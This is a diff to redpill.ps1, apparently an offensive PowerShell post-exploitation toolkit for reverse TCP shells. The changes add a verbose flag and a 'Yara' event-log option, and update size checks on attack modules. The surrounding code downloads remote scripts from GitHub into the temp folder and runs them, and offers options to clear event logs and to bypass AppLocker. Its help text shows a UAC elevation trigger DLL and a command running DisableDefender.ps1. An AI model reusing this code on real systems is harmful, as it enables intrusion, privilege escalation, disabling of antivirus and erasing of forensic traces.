@@ -3,7 +3,7 @@
    CmdLet to assiste reverse tcp shells in post-exploitation
 
    Author: r00t-3xp10it
-   Tested Under: Windows 10 (18363) x64 bits
+   Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
    PS cmdlet Dev version: v1.2.6
@@ -103,7 +103,8 @@
    [string]$DnsSpoof="false",
    [string]$IconSet="False",
    [string]$Sponsor="false",
-   [string]$UacMe="false"
+   [string]$UacMe="false",
+   [string]$Verb="false"
 )
 
 
@@ -213,6 +214,8 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
    .NOTES
       Optional dependencies: curl (geolocation) icacls (file permissions)
       -HideMyAss "True" - Its used to hide the public ip address display!
+      If sellected -sysinfo "verbose" then established & listening connections
+      will be listed insted of list only the established connections (TCP|IPV4)
 
    .Parameter Sysinfo
       Accepts arguments: Enum, Verbose (default: Enum)
@@ -238,7 +241,7 @@ If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 18){## Corrupted download detected => DefaultFileSize: 18,2353515625/KB
+      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,724609375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -587,7 +590,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
    If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
 }
 
-If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Clear" -or $GetLogs -ieq "Verbose"){
+If($GetLogs -ieq "Enum" -or $GetLogs -ieq "Clear" -or $GetLogs -ieq "Verbose" -or $getLogs -ieq "Yara"){
 If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs to display
 
    <#
@@ -613,6 +616,10 @@ If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs
       List the newest 28 Eventvwr Powershell\Application\System entrys
 
    .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 28
+      List -NewEst "28" logfiles with Id: 59,300,4104
+
+   .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Clear
       Remark: Clear @arg requires Administrator privs on shell
 
@@ -630,7 +637,7 @@ If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLogs.ps1 -Destination $Env:TMP\GetLogs.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetLogs.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,484375/KB
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,599609375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetLogs.ps1"){Remove-Item -Path "$Env:TMP\GetLogs.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -642,6 +649,8 @@ If($NewEst -lt "5" -or $NewEst -gt "80"){$NewEst = "10"} ## Set the max\min logs
       powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Enum
    }ElseIf($GetLogs -ieq "Verbose"){
       powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Verbose -NewEst $NewEst
+   }ElseIf($GetLogs -ieq "Yara"){
+      powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Yara -NewEst $NewEst
    }ElseIf($GetLogs -ieq "Clear"){
       powershell -File "$Env:TMP\GetLogs.ps1" -GetLogs Clear
    }
@@ -2016,6 +2025,9 @@ if($AppLocker -ne "false"){
       Author: @r00t-3xp10it
       Helper - Enumerate directorys with weak permissions (bypass applocker)
 
+   .Parameter Verb
+      Accepts arguments: True, False (verbose enumeration)
+
    .Parameter AppLocker
       Accepts arguments: Enum, WhoAmi and TestBat
 
@@ -2064,7 +2076,7 @@ if($AppLocker -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 23){## Corrupted download detected => DefaultFileSize: 23,421875/KB
+      If($SizeDump -lt 23){## Corrupted download detected => DefaultFileSize: 23,486328125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2077,9 +2089,9 @@ if($AppLocker -ne "false"){
    }ElseIf($AppLocker -ieq "Enum"){
 
        If($StartDir -ne "$Env:USERPROFILE"){
-          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$StartDir" -Verb True
+          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$StartDir" -Verb $Verb
        }Else{
-          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$Env:WINDIR" -Verb True
+          powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths" -StartDir "$Env:WINDIR" -Verb $Verb
        }
 
    }ElseIf($AppLocker -ieq "TestBat"){
@@ -2683,6 +2695,8 @@ $HelpParameters = @"
    .NOTES
       Optional dependencies: curl (geolocation) icacls (file permissions)
       -HideMyAss "True" - Its used to hide the public ip address display!
+      If sellected -sysinfo "verbose" then established & listening connections
+      will be listed insted of list only the established connections (TCP|IPV4)
 
    .Parameter Sysinfo
       Accepts arguments: Enum, Verbose (default: Enum)
@@ -2937,7 +2951,7 @@ $HelpParameters = @"
       on shell to be abble to 'Clear' Eventvwr entrys.
 
    .Parameter GetLogs
-      Accepts arguments: Enum, Verbose and Clear
+      Accepts arguments: Enum, Verbose,Yara, Clear
 
    .Parameter NewEst
       How many logfiles (newest) to be displayed (default: 10)
@@ -2953,6 +2967,10 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 28
       List the newest 28 Eventvwr Powershell\Application\System entrys
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 28
+      List -NewEst "28" eventvwr logfiles with Id: 59,300,4104
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Clear
@@ -3867,7 +3885,7 @@ $HelpParameters = @"
 
 "@;
 Write-Host "$HelpParameters"
-}ElseIf($Help -ieq "AppLocker" -or $Help -ieq "GroupName" -or $Help -ieq "FolderRigths"){
+}ElseIf($Help -ieq "AppLocker" -or $Help -ieq "GroupName" -or $Help -ieq "FolderRigths" -or $Help -ieq "Verb"){
 $HelpParameters = @"
 
    <#!Help.
@@ -3885,6 +3903,9 @@ $HelpParameters = @"
       AppLocker.ps1 by Default uses 'BUILTIN\Users' Group Name to search recursive
       for directorys with 'Write' access on %WINDIR% tree. This module also allow
       users to sellect diferent GroupName(s), FolderRigths Or StartDir @arguments!
+
+   .Parameter Verb
+      Accepts arguments: True, False (verbose enumeration)
 
    .Parameter AppLocker
       Accepts arguments: Enum, WhoAmi and TestBat (default: Enum)
@@ -4319,8 +4340,8 @@ $HelpParameters = @"
 
       UAC State     : Enabled
       UAC Settings  : Notify Me
-      ReflectionDll : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
-      Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
+      EOP Trigger   : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
+      RUN cmdline   : powershell -file C:\Users\pedro\AppData\Local\Temp\DisableDefender.ps1 -Action Stop
    #>!bye..
 
 "@;
